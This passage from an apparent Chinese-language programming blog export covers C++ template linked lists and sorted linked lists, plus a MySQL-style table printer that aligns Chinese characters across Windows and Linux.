class="title">LinkedList</span>&lt;T&gt;:</span>:LinkedList(LinkedList&lt;T&gt;&amp;&amp;ll)&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_size=ll.m_size;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_Header=ll.m_Header;</span><br><span class="line">    <span class="comment">// 禁止内存区域共享</span></span><br><span class="line">    ll.m_Header=<span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">LinkedList</span>&lt;T&gt;:</span>:~LinkedList()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;m_Header)&#123;</span><br><span class="line">        <span class="keyword">this</span>-&gt;clearAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:insert(<span class="keyword">int</span> theIndex,<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    <span class="keyword">if</span>(theIndex&lt;<span class="number">0</span>||theIndex&gt;=m_size)<span class="keyword">return</span>;    </span><br><span class="line">    <span class="comment">// 新建头节点</span></span><br><span class="line">    <span class="keyword">if</span>(theIndex==<span class="number">0</span>&amp;&amp;m_Header==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        m_Header=<span class="keyword">new</span> chainNode&lt;T&gt;(data);</span><br><span class="line">        m_size++;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (pNode)&#123;</span><br><span class="line">            <span class="comment">// 在 theIndex之后 插入节点</span></span><br><span class="line">            <span class="keyword">if</span>(index==theIndex)&#123;</span><br><span class="line">                pNode-&gt;next=<span class="keyword">new</span> chainNode&lt;T&gt;(data,pNode-&gt;next);</span><br><span class="line">				<span class="comment">// auto p=new chainNode&lt;T&gt;(data);</span></span><br><span class="line">                <span class="comment">// p-&gt;next=pNode-&gt;next;</span></span><br><span class="line">                <span class="comment">// pNode-&gt;next=p;</span></span><br><span class="line">                m_size++;</span><br><span class="line">            &#125;</span><br><span class="line">            index++;</span><br><span class="line">            pNode=pNode-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:append(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    <span class="keyword">while</span> (pNode-&gt;next)&#123;</span><br><span class="line">        pNode=pNode-&gt;next;   </span><br><span class="line">    &#125;</span><br><span class="line">    pNode-&gt;next=<span class="keyword">new</span> chainNode&lt;T&gt;(data);</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_size++;</span><br><span class="line">&#125;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:clearAll()&#123;</span><br><span class="line">    <span class="keyword">while</span> (m_Header)&#123;</span><br><span class="line">        chainNode&lt;T&gt;*pNextNode=m_Header-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> m_Header;</span><br><span class="line">        m_Header=<span class="literal">nullptr</span>;</span><br><span class="line">        m_Header=pNextNode;</span><br><span class="line">    &#125;</span><br><span class="line">    m_Header=<span class="literal">nullptr</span>;</span><br><span class="line">    m_size=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:eraseByIndex(<span class="keyword">int</span> theIndex)&#123;</span><br><span class="line">    <span class="keyword">if</span>(theIndex&lt;<span class="number">0</span>||theIndex&gt;=m_size)<span class="keyword">return</span>;    </span><br><span class="line">    chainNode&lt;T&gt;*deletedNode=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// 处理删除头节点情况，因为单向链表头结点无前驱节点</span></span><br><span class="line">    <span class="keyword">if</span>(theIndex==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">// 将 m_Header 标记为删除</span></span><br><span class="line">        deletedNode = m_Header;</span><br><span class="line">        m_Header=m_Header-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        chainNode&lt;T&gt;*pNodePre=m_Header;</span><br><span class="line">        <span class="comment">// 找待删除节点的前驱节点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; theIndex<span class="number">-1</span>; i++)&#123;</span><br><span class="line">            pNodePre=pNodePre-&gt;next;   </span><br><span class="line">        &#125;</span><br><span class="line">        deletedNode=pNodePre-&gt;next;</span><br><span class="line">        pNodePre-&gt;next=deletedNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> deletedNode;</span><br><span class="line">    deletedNode=<span class="literal">nullptr</span>;</span><br><span class="line">    m_size--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:erase(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    chainNode&lt;T&gt;*pNodePre;</span><br><span class="line">    <span class="keyword">while</span> (pNode)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pNode-&gt;data==data)&#123;</span><br><span class="line">            <span class="comment">// 处理删除头结点情况</span></span><br><span class="line">            <span class="keyword">if</span>(pNode==m_Header)&#123;</span><br><span class="line">                <span class="keyword">auto</span> next=m_Header-&gt;next;</span><br><span class="line">                <span class="keyword">delete</span> m_Header;</span><br><span class="line">                m_Header=next;</span><br><span class="line">                <span class="comment">// 并使其指向原来头结点的下一个节点</span></span><br><span class="line">                pNode=next;</span><br><span class="line">                m_size--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pNodePre-&gt;next=pNode-&gt;next;</span><br><span class="line">                <span class="keyword">delete</span> pNode;</span><br><span class="line">                pNode=pNodePre;</span><br><span class="line">                m_size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保存前驱节点</span></span><br><span class="line">        pNodePre=pNode;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:empty()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_Header==<span class="literal">nullptr</span>&amp;&amp;<span class="keyword">this</span>-&gt;m_size&lt;=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:size()&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;m_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:indexOf(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pNode&amp;&amp;pNode-&gt;data!=data)&#123;</span><br><span class="line">        index++;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 到达尾节点</span></span><br><span class="line">    <span class="keyword">if</span>(pNode==<span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> index;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">T</span> &amp;<span class="title">LinkedList</span>&lt;T&gt;:</span>:get(<span class="keyword">int</span> index)&#123;</span><br><span class="line">    <span class="keyword">if</span>(index&lt;<span class="number">0</span>||index&gt;=m_size)</span><br><span class="line">        <span class="keyword">throw</span> length_error(<span class="string">"the index is invalid!"</span>);</span><br><span class="line">    chainNode&lt;T&gt;*pNode=m_Header;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pNode&amp;&amp;index!=count++)&#123;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pNode-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">chainNode</span>&lt;T&gt;* <span class="title">LinkedList</span>&lt;T&gt;:</span>:getFirstchainNode()&#123;</span><br><span class="line">    <span class="keyword">return</span> m_Header;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">chainNode</span>&lt;T&gt;* <span class="title">LinkedList</span>&lt;T&gt;:</span>:getLastchainNode()&#123;</span><br><span class="line">    <span class="keyword">auto</span> p=m_Header;</span><br><span class="line">    <span class="keyword">while</span> (p&amp;&amp;p-&gt;next)&#123;</span><br><span class="line">        p=p-&gt;next;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">LinkedList</span>&lt;T&gt;:</span>:outputLinkedList()&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;m_Header==<span class="literal">nullptr</span>)<span class="keyword">return</span>;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=<span class="keyword">this</span>-&gt;m_Header;</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (pNode)&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span>&lt;&lt;<span class="string">"["</span>&lt;&lt;index&lt;&lt;<span class="string">"] =&gt; "</span>&lt;&lt;pNode-&gt;data&lt;&lt;<span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        index++;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="有序链表"><a href="#有序链表" class="headerlink" title="有序链表"></a>有序链表</h3><p>其实我们还可以利用上面的单向链表实现一个简单的有序链表</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"LinkedList.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认升序</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>,<span class="title">class</span> <span class="title">Compare</span>=<span class="title">less</span>&lt;T&gt;&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">SortedLinkedList</span>:</span> <span class="keyword">public</span> LinkedList&lt;T&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="keyword">using</span> LinkedList&lt;T&gt;::LinkedList;</span><br><span class="line">    <span class="keyword">using</span> LinkedList&lt;T&gt;::insert;</span><br><span class="line">    ~SortedLinkedList()&#123;&#125;</span><br><span class="line">    <span class="comment">// 子类insert为有序插入</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">const</span> T&amp;)</span></span>;</span><br><span class="line">    <span class="comment">// 基类insert为无序插入</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 重载insert()函数</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">T</span>,<span class="title">class</span> <span class="title">Compare</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">SortedLinkedList</span>&lt;T,Compare&gt;:</span>:insert(<span class="keyword">const</span> T&amp;data)&#123;</span><br><span class="line">    chainNode&lt;T&gt;*pNode=<span class="keyword">this</span>-&gt;m_Header;</span><br><span class="line">    chainNode&lt;T&gt;*pNodePre=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="comment">// Compare()(pNode-&gt;data,data) 等价于 pNode-&gt;data &lt; data</span></span><br><span class="line">    <span class="comment">// 找前驱节点</span></span><br><span class="line">    <span class="keyword">while</span> (pNode&amp;&amp;Compare()(pNode-&gt;data,data))&#123;</span><br><span class="line">        pNodePre=pNode;</span><br><span class="line">        pNode=pNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 若无前驱节点，那么没有头结点 或者 pNode-&gt;data &gt; data</span></span><br><span class="line">    <span class="keyword">if</span>(pNodePre==<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="comment">// 更新头结点</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;m_Header=<span class="keyword">new</span> chainNode&lt;T&gt;(data,pNode);</span><br><span class="line">        <span class="comment">// 等价于</span></span><br><span class="line">        <span class="comment">// auto p=new chainNode&lt;T&gt;(data);</span></span><br><span class="line">        <span class="comment">// p-&gt;next=pNode; </span></span><br><span class="line">        <span class="comment">// this-&gt;m_Header=p;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 插入新节点</span></span><br><span class="line">        chainNode&lt;T&gt;*p=<span class="keyword">new</span> chainNode&lt;T&gt;(data,pNode);</span><br><span class="line">        pNodePre-&gt;next=p;</span><br><span class="line">        <span class="comment">// 等价于</span></span><br><span class="line">        <span class="comment">// auto p=new chainNode&lt;T&gt;(data);</span></span><br><span class="line">        <span class="comment">// p-&gt;next=pNode;</span></span><br><span class="line">        <span class="comment">// pNodePre-&gt;next=p;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>-&gt;m_size++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>链表元素在内存随机存储的，占用一定的内存空间，且查找速度要慢于顺序表，但在插入和删除方面要优于顺序表。如果有一种数据结构够将两者结合起来，那么就能够充分利用两者的优点，这种数据结构就是跳表和散列表。</p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C++简单实现MySQL表格输出功能</title>
    <url>/cpp-printtable/</url>
    <content><![CDATA[<p>其实在很早之前，我就对MySQL的表格输出很感兴趣并想用C++实现，主要是因为它支持中文输出。因此前一段时间我实现了第一版的MyPrettyTable(简化版的Python的库PrettyTable?)，然而令人失望的是它在含有中文汉字的情况下会发生混乱而无法对齐，于是我放弃了。不过昨天在写代码时偶然看到之前那个被搁置的project，于是不甘心的我再次重新实现了这个功能…其实就是利用的setw和left</p>
<a id="more"></a>

<h2 id="Python中的PrettyTable"><a href="#Python中的PrettyTable" class="headerlink" title="Python中的PrettyTable"></a>Python中的PrettyTable</h2><p>用C++写MyPrettyTable的代码格式是按照Python中的PrettyTable。因此MyPrettyTable相对来说比较简单</p>
<h2 id="中文汉字处理问题"><a href="#中文汉字处理问题" class="headerlink" title="中文汉字处理问题"></a>中文汉字处理问题</h2><p>由于UTF-8编码是变长编码，通常汉字占三个字节，而英文占一个字节<br>在终端下显示汉字占两个字符宽，而英文字母只占一个字符宽</p>
<p>比如 <code>string s = &quot;好&quot;;</code><br>在Linux下 s.size() = 3  在Windows下 s.size() = 2<br>再比如下面的代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> s1 = <span class="string">"你好世界"</span>;</span><br><span class="line"><span class="built_in">string</span> s2 = <span class="string">"你好世"</span>;</span><br><span class="line"><span class="built_in">string</span> s3 = <span class="string">"你好"</span>;</span><br><span class="line"><span class="keyword">int</span> size = s1.size();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; size &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>.fill(<span class="string">'.'</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; <span class="string">""</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; s1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; s2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; left &lt;&lt; setw(size) &lt;&lt; s3 &lt;&lt; <span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>

<p>在Windows下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8</span><br><span class="line">........    //8  </span><br><span class="line">你好世界    // 2x4=8</span><br><span class="line">你好世..    // 2x3+2=8</span><br><span class="line">你好....	 // 2x2+4=8</span><br></pre></td></tr></table></figure>

<p>然而在Linux下面却是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">12</span><br><span class="line">............ //12</span><br><span class="line">你好世界xxxx  // 3x4=12</span><br><span class="line">你好世...xxx  // 3x3+3=12</span><br><span class="line">你好......xx   // 3x2+6=12</span><br></pre></td></tr></table></figure>

<p>因此在Windows下，输出中文能够很好的对齐，但在Linux下就不是这样了。<br>Windows下的显示中文字符宽恰好是两个英文字母，而Linux下显示中文字符宽等于两个英文字母，但是编码时却是占3个字节！</p>
<p>当我将上面Linux下没有对齐的内容用 x 填充后发现  <strong>不足的填充 x 的个数等于中文汉字的个数</strong>！<br>于是为了解决这个不对齐问题，我在处理setw()是采用了WIN32/__linux__宏区分不同的平台</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">padding_left(<span class="keyword">this</span>-&gt;m_ColumnsContent_max_len[i] + _get_Chinese_len(str));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WIN32</span></span><br><span class="line">        padding_left(<span class="keyword">this</span>-&gt;m_ColumnsContent_max_len[i]);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __linux__</span></span><br><span class="line">        padding_left(<span class="keyword">this</span>-&gt;m_ColumnsContent_max_len[i] + _get_Chinese_len(str));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>此时中文汉字的处理问题得以解决，但是如果还有其他一些中文标点符号呢？或者说怎么判断是否存在中文或中文标点符号呢？</p>
<p>因此我定义一个Sign.h头文件用于存放那些特殊的符号，以下为对应中文标点符号的unicode码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PRETTYTABLE_SIGN_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRETTYTABLE_SIGN_H</span></span><br><span class="line"><span class="comment">// special punctuation character</span></span><br><span class="line"><span class="keyword">enum</span>&#123;</span><br><span class="line">    PC1=<span class="number">0x3002</span>u,</span><br><span class="line">    PC2=<span class="number">0xFF1F</span>u,</span><br><span class="line">    PC3=<span class="number">0xFF01</span>u,</span><br><span class="line">    PC4=<span class="number">0xFF0C</span>u,</span><br><span class="line">    PC5=<span class="number">0x3001</span>u,</span><br><span class="line">    PC6=<span class="number">0xFF1B</span>u,</span><br><span class="line">    PC7=<span class="number">0xFF1A</span>u,</span><br><span class="line">    PC8=<span class="number">0x300C</span>u,</span><br><span class="line">    PC9=<span class="number">0x300D</span>u,</span><br><span class="line">    PC10=<span class="number">0x2018</span>u,</span><br><span class="line">    PC11=<span class="number">0x2019</span>u,</span><br><span class="line">    PC12=<span class="number">0xFF08</span>u,</span><br><span class="line">    PC13=<span class="number">0xFF09</span>u,</span><br><span class="line">    PC14=<span class="number">0x3014</span>u,</span><br><span class="line">    PC15=<span class="number">0x3015</span>u,</span><br><span class="line">    PC16=<span class="number">0x3010</span>u,</span><br><span class="line">    PC17=<span class="number">0x3011</span>u,</span><br><span class="line">    PC18=<span class="number">0x2014</span>u,</span><br><span class="line">    PC19=<span class="number">0x2026</span>u,</span><br><span class="line">    PC20=<span class="number">0x2013</span>u,</span><br><span class="line">    PC21=<span class="number">0xFF0E</span>u,</span><br><span class="line">    PC22=<span class="number">0x300A</span>u,</span><br><span class="line">    PC23=<span class="number">0x300B</span>u,</span><br><span class="line">    PC24=<span class="number">0x3008</span>u,</span><br><span class="line">    PC25=<span class="number">0x3009</span>u,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">enum</span> <span class="class"><span class="keyword">class</span> <span class="title">Sign</span>&#123;</span></span><br><span class="line">    PT_PLUS=<span class="string">'+'</span>, </span><br><span class="line">    PT_H =<span class="string">'-'</span>, </span><br><span class="line">    PT_V =<span class="string">'|'</span>, </span><br><span class="line">    PT_DOT= <span class="string">'.'</span>, </span><br><span class="line">    PT_EQUAL= <span class="string">'='</span> ,</span><br><span class="line">    PT_SIG_1= <span class="string">'@'</span> ,</span><br><span class="line">    PT_SIG_2= <span class="string">'#'</span> ,</span><br><span class="line">    PT_SIG_3= <span class="string">'$'</span>, </span><br><span class="line">    PT_SIG_4= <span class="string">'%'</span>, </span><br><span class="line">    PT_SIG_5= <span class="string">'\\'</span>, </span><br><span class="line">    PT_SIG_6=<span class="string">'*'</span>, </span><br><span class="line">    PT_SIG_7=<span class="string">'/'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>判断一个字符串中是否存在中文且存在多少个中文汉字或标点符号，我们需要将其转化为wchar_t 指针类型的字符串，函数StringToWString讲一个string类型字符串转化为wstring类型字符串。需要注意的是在Windows下mbstowcs是不安全的，需要替换为mbstowcs_s，不过这里我简单的禁止了该错误</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">wstring</span> <span class="title">PrettyTable::StringToWString</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp; str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> nLen=str.length()*<span class="number">2</span>;</span><br><span class="line">    setlocale(LC_CTYPE,<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">wchar_t</span> *wcs=<span class="keyword">new</span> <span class="keyword">wchar_t</span>[nLen];</span><br><span class="line">    wmemset(wcs,<span class="number">0</span>,nLen);</span><br><span class="line">    <span class="keyword">size_t</span> s;</span><br><span class="line">    mbstowcs(wcs,str.c_str(),nLen);</span><br><span class="line">    <span class="built_in">wstring</span> w=wcs;</span><br><span class="line">    <span class="keyword">delete</span>[]wcs;</span><br><span class="line">    <span class="keyword">return</span> w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断字符串中中文汉字和标点符号数目</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> PrettyTable::_get_Chinese_len(<span class="keyword">const</span> <span class="built_in">string</span>&amp; str)&#123;</span><br><span class="line">    <span class="built_in">wstring</span> ss=StringToWString(str);</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;ss.length() ; ++i) &#123;</span><br><span class="line">        <span class="keyword">wchar_t</span> wcs=ss.c_str()[i];</span><br><span class="line">        <span class="keyword">if</span>((wcs&gt;=<span class="number">0x4E00</span>u&amp;&amp;wcs&lt;=<span class="number">0x9FFF</span>u)</span><br><span class="line"> ||wcs==PC1||wcs==PC2||wcs==PC3||wcs==PC4||wcs==PC5||wcs==PC6||wcs==PC7||wcs==PC8||wcs==PC9  ||wcs==PC10||wcs==PC11||wcs==PC12||wcs==PC13||wcs==PC14||wcs==PC15||wcs==PC16||wcs==PC17</span><br><span class="line"> ||wcs==PC18||wcs==PC19||wcs==PC20||wcs==PC21||wcs==PC22||wcs==PC23||wcs==PC24||wcs==PC25)&#123;</span><br><span class="line">            sum++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="添加Header-amp-draw-header"><a href="#添加Header-amp-draw-header" class="headerlink" title="添加Header &amp;  _draw_header"></a>添加Header &amp;  _draw_header</h2><p>在添加一个Header时，我就获取其表头(列)的数目，并添加到 <code>this-&gt;m_multiColumns</code> 中，后续再每添加一行row时同时还要将row转化为column并在添加到<code>this-&gt;m_multiColumns</code>中，为的是 <strong>获取每一列中字符串的最大宽度</strong> 使得整个表格对齐。</p>
<p>比如我要画一个表格头，我是按照一行一行去输出相应的数据并重定向到内部的 <code>stringstream m_innerOss</code><br>注意的是，每个表头内边距为1个空格，因此我还定义了一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define PADDING_LEFT_RIGHT 2</span><br></pre></td></tr></table></figure>

<p>表示内边距的大小</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----+------------------+----------+----------+---------------------+</span><br><span class="line">| xx | xx               | xx       | xx       | xx                  |</span><br><span class="line">+----+------------------+----------+----------+---------------------+</span><br></pre></td></tr></table></figure>

<h2 id="添加Rows-amp-draw-rows"><a href="#添加Rows-amp-draw-rows" class="headerlink" title="添加Rows &amp;  _draw_rows"></a>添加Rows &amp;  _draw_rows</h2><p>这里我想说的是<br>set()中可以有两种写法</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">setw() = MaxSizeStr + String.Size() - StringCapacity(String)</span><br><span class="line">setw() = MaxSizeStr + Length(Chinese hans)</span><br></pre></td></tr></table></figure>

<p>也就是说 setw()应该设置的值为 <strong>每一个this-&gt;m_multiColumns 中最大字符串宽度+中文汉字/标点符号数目</strong><br>这个 StringCapacity 函数就是获取字符串中显示的字符宽度 &lt;= string.size()</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PrettyTable::StringCapacity</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp; raw_str)</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WIN32</span></span><br><span class="line">    <span class="keyword">return</span> raw_str.size();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> __linux__</span></span><br><span class="line">    <span class="keyword">return</span> raw_str.size() - <span class="keyword">this</span>-&gt;_get_Chinese_len(raw_str);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>我已经把代码放在 <a href="https://github.com/josexy/MyPrettyTable/" target="_blank" rel="noopener">Github</a> 上了，可以去看看代码，虽然写得有点糟…… 不过核心部分还是利用C++的setw和left。<br>这个project算是到此结束了吧，不过以后有没有可能再继续添加一些东西就不知道了……</p>
<p>图片展示如下</p>
<p><img src="/uploads/images/cpp_table/photo_linux.png" alt="image"></p>
<p><img src="/uploads/images/cpp_table/photo_windows.png" alt="image"></p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>位运算实现加减乘除</title>
    <url>/add-subtract-multiply-divide/</url>
